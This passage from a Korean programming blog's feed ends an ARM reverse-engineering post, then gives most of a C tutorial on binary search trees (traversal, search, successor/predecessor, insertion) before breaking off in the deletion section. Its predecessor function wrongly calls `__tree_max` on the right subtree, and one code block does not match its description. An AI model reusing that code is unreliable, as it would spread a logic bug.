a2-&gt;unkc-&gt;unkc[a1-&gt;unkc].unk16;</span><br><span class="line">    v6 = foo(a1-&gt;unk0);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v6 == <span class="number">0x61</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v5 != <span class="number">0x61</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v6 != <span class="number">0x62</span> &amp;&amp; v5 &lt; <span class="number">0x63</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="%EA%B2%B0%EB%A1%A0" tabindex="-1">결론</h2>
<p>ARM 아키텍처는 RISC 아키텍처로 인스트럭션의 길이가 고정되어 있고, 메모리 접근에 load-store 모델을 사용합니다. 특히 조건부 실행이나 배럴 시프터와 같은 독특한 기능은 적은 개수의 인스트럭션으로도 다양한 코드를 표현할 수 있다는 장점이 있습니다. 범용 레지스터나 인스트럭션의 종류 등은 x86/x64 아키텍처와 차이를 보이나, 함수 호출과 분기의 원리, 구조체의 표현 등 근본적인 부분에서는 공통점을 찾을 수 있었습니다.</p>
<h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">참고자료</h2>
<p>[1] B. Dang, A. Gazet and E. Bachaalany, “ARM,” in <em>Practical Reverse Engineering</em>. Indianapolis, IN: Wiley, 2014, pp. 39-77.</p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Security</category>
        <category>Reverse Engineering</category>
      </categories>
  </entry>
  <entry>
    <title>이진 탐색 트리</title>
    <url>/2022/06/08/binary-search-tree/</url>
    <content><![CDATA[<blockquote class="callout-note">
    <p>
    <strong>유의사항</strong><br>
    이 글은 Introduction to Algorithms 책의 내용을 학습 목적으로 정리하고 일부를 수정하거나 추가한 내용입니다.
    </p>
</blockquote>
<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<p>이진 탐색 트리의 정의와 성질을 살펴보고 구현해 보겠습니다.</p>
<h2 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC%EB%9E%80" tabindex="-1">이진 탐색 트리란</h2>
<h3 id="%EC%A0%95%EC%9D%98%EC%99%80-%EC%84%B1%EC%A7%88" tabindex="-1">정의와 성질</h3>
<p>이진 탐색 트리(binary search tree)는 이진 트리면서, 다음과 같은 재귀적인 성질을 가진 트리입니다.</p>
<blockquote>
<p>노드를 기준으로 왼쪽 트리에 있는 노드들은 더 작은 키(key)를 가진다. 오른쪽 트리에 있는 노드들은 더 큰 키를 가진다.</p>
</blockquote>
<p>성질에서 알 수 있듯, 이진 탐색  트리는 키-값(key-value)의 데이터를 저장하는 자료구조입니다. 이 글에서는 편의상 키와 값은 모두 정수이며, 두 값이 같아고 가정하겠습니다. 아래 그림의 두 트리는 모두 위의 성질을 만족하는 이진 탐색 트리입니다.</p>
<p><img src="/images/binary-search-tree/1.png" alt="1.png"></p>
<p>이진 탐색 트리는 성질 상 탐색, 삽입, 삭제 등 연산의 시간 복잡도가 트리의 높이에 비례합니다. 따라서 같은 데이터를 저장하는 트리라도 형태에 따라 복잡도의 차이가 생길 수 있습니다. 그림에서 왼쪽의 경우 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>의 시간 복잡도를 갖지만, 오른쪽과 같이 비효율적인 경우 최악에는 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>의 복잡도를 갖게 됩니다.</p>
<h3 id="%EA%B5%AC%EC%A1%B0%EC%B2%B4%EC%99%80-%ED%95%A8%EC%88%98-%EC%84%A0%EC%96%B8" tabindex="-1">구조체와 함수 선언</h3>
<p>자료구조 구현은 모두 C언어로 하겠습니다. 트리의 노드에 해당하는 <code>Node</code> 구조체는 키와 값을 나타내는 <code>key</code> 와 <code>value</code> , 각각 왼쪽 자식, 오른쪽 자식, 부모 노드를 가리키는 포인터 <code>left</code> , <code>right</code> , <code>parent</code> 를 멤버로 가집니다. 이진 탐색 트리를 나타내는 <code>BST</code> 구조체는 루트 노드를 가리키는 포인터 <code>root</code> 를 멤버로 가집니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> key, value;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">left</span>, *<span class="title">right</span>, *<span class="title">parent</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BinarySearchTree</span> &#123;</span></span><br><span class="line">	Node *root;</span><br><span class="line">&#125; BST;</span><br></pre></td></tr></table></figure>
<p>이진 탐색 트리의 연산을 구현하기 위한 함수들은 다음과 같습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 모든 노드를 키 순으로 출력합니다.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(BST *bst)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 주어진 키를 가진 노드를 찾아 반환합니다.</span></span><br><span class="line">Node *<span class="title function_">search</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 키 순으로 정렬했을 때 하나 작은 키를 가진 노드를 반환합니다.</span></span><br><span class="line">Node *<span class="title function_">prev</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 키 순으로 정렬했을 때 하나 큰 키를 가진 노드를 반환합니다.</span></span><br><span class="line">Node *<span class="title function_">next</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 새로운 노드를 삽입합니다.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(BST* bst, <span class="type">int</span> key, <span class="type">int</span> value)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 주어진 키를 가진 노드를 삭제합니다.</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(BST *bst, <span class="type">int</span> key)</span>;</span><br></pre></td></tr></table></figure>
<p>위의 함수들을 구현하기 위해 내부적으로 다음과 같은 내장 함수들을 사용합니다. 함수 이름 앞에 언더스코어(underscore) 두 개가 붙어 있으면 내장 함수로 구분하겠습니다. 이 함수들의 필요성과 쓰임에 대해서는 밑에서 하나씩 살펴볼 예정입니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 노드를 기준으로 중위 순회하며 키와 값을 출력합니다.</span></span><br><span class="line"><span class="type">void</span> __tree_walk(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 노드를 기준으로 하위 트리에서 주어진 키를 가진 노드를 찾아 반환합니다.</span></span><br><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 노드를 기준으로 왼쪽 트리에서 가장 작은 키를 가진 노드를 반환합니다.</span></span><br><span class="line">Node *__tree_min(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 노드를 기준으로 오른쪽 트리에서 가장 큰 키를 가진 노드를 반환합니다.</span></span><br><span class="line">Node *__tree_max(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 키 순으로 정렬했을 때 노드의 키보다 하나 작은 키를 가진 노드를 반환합니다.</span></span><br><span class="line">Node *__tree_predecessor(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 키 순으로 정렬했을 때 노드의 키보다 하나 큰 키를 가진 노드를 반환합니다.</span></span><br><span class="line">Node *__tree_successor(Node *x);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 트리에서 노드 u의 위치에 노드 v를 대입합니다.</span></span><br><span class="line"><span class="type">void</span> __transplant(BST *bst, Node *u, Node *v);</span><br></pre></td></tr></table></figure>
<h2 id="%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8A%B8%EB%A6%AC-%EA%B5%AC%ED%98%84" tabindex="-1">이진 탐색 트리 구현</h2>
<h3 id="%ED%8A%B8%EB%A6%AC-%EC%88%9C%ED%9A%8C%ED%95%98%EA%B8%B0" tabindex="-1">트리 순회하기</h3>
<p>이제 제일 쉬운 함수부터 하나씩 구현해 봅시다. 가장 먼저 순회는 아주 쉬운데, 이진 트리를 중위 순회(in-order)해주면 됩니다. 이진 탐색 트리의 성질로 인해 키가 작은 노드부터 정렬된 순서로 순회하게 됩니다.</p>
<p><img src="/images/binary-search-tree/2.png" alt="2.png"></p>
<p>순회를 위한 내장 함수 <code>__tree_walk</code> 는 재귀 호출을 이용해 구현합니다. 왼쪽 트리를 재귀적으로 순회하고, 자신의 키와 값을 출력하고, 다시 오른쪽 트리를 재귀적으로 순회하는 방식입니다. 트리의 출력을 위한 <code>print</code> 함수는 루트 노드를 기준으로 순회를 수행하면 됩니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 내장 함수</span></span><br><span class="line"><span class="type">void</span> __tree_walk(Node *x) &#123;</span><br><span class="line">	<span class="keyword">if</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		__tree_walk(x-&gt;left);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, x-&gt;key, x-&gt;value);</span><br><span class="line">		__tree_walk(x-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(BST *bst)</span> &#123;</span><br><span class="line">	__tree_walk(bst-&gt;root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="%ED%82%A4%EB%A5%BC-%EA%B0%80%EC%A7%84-%EB%85%B8%EB%93%9C-%EC%B0%BE%EA%B8%B0" tabindex="-1">키를 가진 노드 찾기</h3>
<p>다음은 탐색입니다. 탐색은 특정 키를 가진 노드를 찾는 연산으로, 사용하는 언어가 딕셔너리(dictionary), 맵(map), 연관 배열(associative array) 같은 이름의 자료구조를 지원한다면 숱하게 쓰는 연산입니다. 이진 탐색 트리는 이진 탐색을 통해 평균적으로 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq> 시간에 특정 키를 가진 노드를 찾을 수 있습니다. 아래 그림은 이진 탐색을 통해 키 <code>13</code> 을 가진 노드를 찾는 과정을 나타내고 있습니다.</p>
<p><img src="/images/binary-search-tree/3.png" alt="3.png"></p>
<p>탐색을 위한 내장 함수 <code>__tree_search</code> 는 노드 <code>x</code> 의 키와 주어진 <code>key</code> 를 반복하여 비교합니다. 주어진 <code>key</code> 가 더 크다면 <code>x</code> 의 오른쪽 자식을 <code>x</code> 에 대입하여 오른쪽 트리에서 반복을 계속합니다. <code>key</code> 가 더 작은 경우 왼쪽 트리에서 반복을 계속합니다. 반복문의 종료 조건으로 <code>x</code> 의 키와 <code>key</code> 가 일치하면 성공적으로 찾은 경우입니다. <code>x</code> 가 <code>NULL</code> 이 되는 경우는 주어진 <code>key</code> 를 찾지 못한 경우입니다.</p>
<p>탐색 연산은 일반적인 이진 탐색과 매우 유사합니다. <code>__tree_walk</code> 와 같이 재귀적으로 구현할 수도 있으나, 반복적으로 구현하는 쪽이 함수 호출과 반환에 필요한 시간과 공간을 아낄 수 있습니다. 트리에서의 탐색 연산을 위한 <code>__search</code> 함수는 루트 노드를 기준으로 탐색을 수행하면 됩니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 내장 함수</span></span><br><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key) &#123;</span><br><span class="line">	<span class="keyword">while</span> (x != <span class="literal">NULL</span> &amp;&amp; x-&gt;key != key) &#123;</span><br><span class="line">		x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">search</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> __tree_search(bst-&gt;root, key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>같은 원리로 가장 작은 키를 가진 노드를 반환하는 <code>__tree_min</code>, 가장 큰 키를 가진 노드를 반환하는 <code>__tree_max</code> 내장 함수도 구현할 수 있습니다. 이진 탐색 트리의 성질에 따라 왼쪽 자식만 따라가면 가장 작은 키, 오른쪽 자식만 따라가면 가장 큰 키가 나오게 됩니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Node *__tree_search(Node *x, <span class="type">int</span> key) &#123;</span><br><span class="line">	<span class="keyword">while</span> (x != <span class="literal">NULL</span> &amp;&amp; x-&gt;key != key) &#123;</span><br><span class="line">		x = (key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *__tree_min(Node *x) &#123;</span><br><span class="line">	<span class="keyword">while</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		x = x-&gt;left;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="%EC%9D%B4%EC%A0%84%EA%B3%BC-%EB%8B%A4%EC%9D%8C-%EB%85%B8%EB%93%9C-%EC%B0%BE%EA%B8%B0" tabindex="-1">이전과 다음 노드 찾기</h3>
<p>이진 탐색 트리는 정렬된 자료구조입니다. 정렬된 자료구조에서는 특정 데이터의 이전 순서나 다음 순서의 데이터를 조회해야 하는 경우가 있습니다. 그런데 이진 탐색 트리의 성질을 활용하면, 이전 순서나 다음 순서를 찾기 위해 키를 서로 비교하지 않고도 이들 노드를 찾아낼 수 있습니다.</p>
<p>먼저 다음 순서를 찾는 연산을 보겠습니다. 다음 순서를 찾을 때는 트리의 형태에 따라 그림과 같이 두 가지 경우가 존재합니다. 그림의 왼쪽은 <code>3</code> 의 다음 노드 <code>4</code> 를 찾는 과정으로, <code>3</code> 의 오른쪽 자식이 존재하고 있습니다. 이진 탐색 트리의 성질에 따라, 오른쪽 자식이 존재하는 경우 오른쪽 트리에서 키가 최솟값인 노드를 찾으면 됩니다. 현재 노드보다 키가 큰 노드들 중에서 가장 작은 노드를 찾으면 그것이 다음 노드이기 때문입니다.</p>
<p><img src="/images/binary-search-tree/4.png" alt="4.png"></p>
<p>그림의 오른쪽은 <code>5</code> 의 다음 노드가 <code>6</code> 을 찾고 있습니다. 그런데 <code>5</code> 는 오른쪽 자식 노드가 없습니다. 이런 경우에도 자기보다 키가 작은 노드는 왼쪽 트리, 큰 노드는 오른쪽 트리에 존재한다는 성질을 이용합니다. 기준 노드의 조상 노드들을 조회하면서 기준 노드를 왼쪽 트리의 노드로 갖는 첫 번째 조상을 찾으면, 키의 비교 없이도 다음 노드를 찾을 수 있습니다. 더욱 복잡한 이 경우도 최악의 시간 복잡도가 트리의 높이에 비례하므로, 다음 노드를 찾는 연산의 시간 복잡도는 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>입니다.</p>
<p>노드를 기준으로 다음 노드를 찾는 내장 함수 <code>__tree_successor</code> 는 두 경우를 구분하기 위한 분기문이 존재합니다. 4행은 오른쪽 자식이 존재하는 경우로, <code>__tree_min</code> 함수를 이용해 오른쪽 트리에서 키가 최솟값인 노드를 찾아 반환합니다. 7행은 오른쪽 자식이 없는 경우로, 이 때는 두 노드의 관계를 비교하기 위해 기준 노드 <code>x</code> 의 부모를 가리키는 포인터 <code>y</code> 를 사용합니다. <code>x</code> 는 부모 노드를 가리키는 포인터를 계속 따라가면서, <code>y</code> 가 <code>x</code> 의 부모를 가리키도록 계속 갱신합니다. 처음으로 <code>x</code> 가 <code>y</code> 의 왼쪽 자식이 되는 순간, <code>y</code> 를 반환합니다.</p>
<p>주어진 키에 대한 다음 노드를 반환하는 연산에 해당하는 <code>next</code> 함수는 앞서 구현한 내장 함수 <code>__tree_search</code> 를 이용해 주어진 키를 가진 노드를 찾습니다. 이후 해당 노드에 대해 내장 함수 <code>__tree_successor</code> 를 호출하여 다음 노드를 찾아 반환합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 내장 함수</span></span><br><span class="line">Node *__tree_successor(Node *x) &#123;</span><br><span class="line">	Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (x-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> __tree_min(x-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;right) &#123;</span><br><span class="line">		x = y;</span><br><span class="line">		y = y-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">next</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> __tree_successor(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>이전 순서를 찾을 때도 트리의 형태에 따라 두 가지 경우가 존재합니다. 다음 순서를 찾을 때와 똑같이 처리하면 됩니다. 왼쪽 자식이 있는 경우는 왼쪽 트리에서 최댓값을 반환합니다. 왼쪽 자식이 없는 경우, 조상 노드들을 조회하면서 기준 노드를 오른쪽 트리의 노드로 갖는 첫 번째 조상을 찾아야 합니다.</p>
<p><img src="/images/binary-search-tree/5.png" alt="5.png"></p>
<p>이전 노드를 찾는 내장 함수 <code>__tree_predecessor</code> 와, 주어진 키에 대한 이전 노드를 찾는 함수 <code>prev</code> 는 다음 노드를 찾는 코드와 똑같은 원리로 구현하면 됩니다. 단, 사용하는 함수가 <code>__tree_min</code> 에서 <code>__tree_max</code> 로 바뀌는 등 방향만 바꿔줍니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 내장 함수</span></span><br><span class="line">Node *__tree_predecessor(Node *x) &#123;</span><br><span class="line">	Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> __tree_max(x-&gt;right);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;left) &#123;</span><br><span class="line">		x = y;</span><br><span class="line">		y = y-&gt;parent;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">prev</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">	Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> __tree_predecessor(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="%ED%8A%B8%EB%A6%AC%EC%97%90-%EB%85%B8%EB%93%9C-%EC%82%BD%EC%9E%85%ED%95%98%EA%B8%B0" tabindex="-1">트리에 노드 삽입하기</h3>
<p>새로운 노드를 이진 탐색 트리에 추가하는 연산은 삽입 연산입니다. 삽입 연산은 새로운 노드를 항상 리프 노드로 추가하면 쉽게 구현할 수 있습니다. 아래 그림은 이진 탐색 트리에 새로운 키 <code>7</code> 을 가진 노드를 삽입하는 과정을 나타내고 있습니다.</p>
<p><img src="/images/binary-search-tree/6.png" alt="6.png"></p>
<p>노드를 삽입하기 위해서는, 이진 탐색을 통해 삽입할 노드를 자식으로 가질 노드를 찾아야 합니다. 삽입할 노드를 왼쪽 자식으로 가질 노드라면 기존에 왼쪽 자식이 없어야 하고, 오른쪽 자식으로 가질 노드라면 오른쪽 자식이 없어야 합니다. 그림에서는 이진 탐색을 통해 키 <code>7</code> 의 새로운 노드를 삽입할 노드를 찾습니다. 키 <code>8</code> 을 가진 노드가 왼쪽 자식이 없으면서, <code>7</code> 은 <code>8</code> 보다 작으니 해당 노드의 왼쪽 자식으로 삽입하는 것입니다. 삽입 연산의 시간 복잡도 또한 트리의 높이에 비례하므로, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>입니다.</p>
<p>삽입 연산을 구현한 <code>insert</code> 함수는 키와 값을 인자로 받고, <code>malloc</code> 함수를 통해 새로운 노드를 생성합니다. 이후 6행에서 루트 노드에서 시작하는 포인터 <code>x</code> 와, <code>x</code> 의 부모를 가리키는 포인터 <code>y</code> 를 이용하여 이진 탐색을 수행합니다. 반복문의 종료 조건은 <code>y</code> 의 자식 <code>x</code> 가 <code>NULL</code> 이 되는 것으로, 이때의 <code>x</code> 의 위치가 새로운 노드를 삽입해야 할 위치입니다. 12행에서는 주어진 키 값과 <code>y</code> 의 키 값을 비교하여, 왼쪽 자식으로 삽입할지 오른쪽 자식으로 삽입할지 결정합니다. 만약 이진 탐색 트리가 비어 있었다면 새로운 노드를 루트 노드로 설정합니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(BST* bst, <span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">	Node *newnode = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">	Node *x = bst-&gt;root, *y = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	*newnode = (Node) &#123; key, value, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">	<span class="keyword">while</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		y = x;</span><br><span class="line">		x = (newnode-&gt;key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">	&#125;</span><br><span class="line">	newnode-&gt;parent = y;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> (y == <span class="literal">NULL</span>) &#123;	<span class="comment">// 이진 탐색 트리가 비어 있는 경우</span></span><br><span class="line">		bst-&gt;root = newnode;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (newnode-&gt;key &lt; y-&gt;key) &#123;</span><br><span class="line">		y-&gt;left = newnode;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		y-&gt;right = newnode;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="%ED%8A%B8%EB%A6%AC%EC%97%90%EC%84%9C-%EB%85%B8%EB%93%9C-%EC%82%AD%EC%A0%9C%ED%95%98%EA%B8%B0" tabindex="-1">트리에서 노드 삭제하기</h3>
<p>트리에서 노드를 삭제하는 연산은 구현 중 다소 까다로운 부분입니다. 항상 새로운 노드를 리프 노드로 추가하는 삽입 연산과 달리, 노드를 중간에서 삭제하게 되면 트리의 형태가 변형되기 때문입니다. 노드를 삭제할 때는 삭제할 노드가 가진 자식의 개수에 따라 경우가 나누어집니다. 아래 그림은 트리에서 키 <code>3</code> 을 가진 노드를 삭제하는 모습으로, 삭제할 노드가 자식이 아예 없거나 하나인 경우입니다.</p>
<p><img src="/images/binary-search-tree/7.png" alt="7.png"></p>
<p>그림의 경우는 비교적 단순한 경우로, 자식이 없는 경우는 단순히 삭제하면 됩니다. 자식이 하나 있는 경우는 해당 자식 노드를 삭제할 노드 위치에 대입하면, 이진 탐색 트리의 성질을 유지하면서 삭제를 수행할 수 있습니다. 사실 이 둘은 구현 상으로는 동일한 경우입니다. 자식이 없는 경우도 <code>NULL</code> 자식 노드가 있어 삭제할 위치에 <code>NULL</code> 을 대입한다고 생각하면 자식이 하나인 경우와 같은 코드로 처리할 수 있기 때문입니다.</p>
<p>반면 자식이 두 개 있는 경우는 조금 복잡합니다. 이 때는 트리에서 순서 상 다음 노드를 찾은 후, 다음 노드가 삭제할 노드의 오른쪽 자식인지 아닌지에 따라 경우가 나뉘게 됩니다. 먼저 다음 노드가 오른쪽 자식인 경우는 다음 노드를 삭제할 노드 위치에 대입합니다. 이 때 이진 탐색 트리의 성질에 의해 다음 노드는 왼쪽 자식이 없습니다. 만약 왼쪽 자식이 있으면 그쪽이 다음 노드가 되어 모순이기 때문입니다. 따라서 삭제할 노드 위치에 대입하여도, 삭제할 노드의 왼쪽 자식을 그대로 왼쪽 자식으로 가질 수 있습니다.</p>
<p><img src="/images/binary-search-tree/8.png" alt="8.png"></p>
<p>다음 노드가 삭제할 노드의 오른쪽 자식이 아닐 수도 있습니다. 이 때 삭제할 노드를 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq>, 삭제할 노드의 오른쪽 자식을 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></eq>, 삭제할 노드의 다음 노드를 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq> 라고 하겠습니다. 이 경우에는 트리를 두 번 움직여 주어야 합니다. 먼저 다음 노드 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation 